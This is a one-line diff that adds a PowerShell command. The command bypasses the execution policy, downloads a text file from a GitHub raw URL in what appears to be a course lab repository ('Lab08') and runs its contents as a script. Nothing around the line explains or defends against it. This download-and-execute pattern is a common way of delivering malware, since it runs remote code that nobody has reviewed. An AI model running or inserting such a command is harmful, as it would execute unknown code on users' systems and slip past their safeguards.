@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "https://raw.githubusercontent.com/arsiddiqui/CSC846_Falls2025/refs/heads/main/Lab08/test.txt").Content).Invoke();"
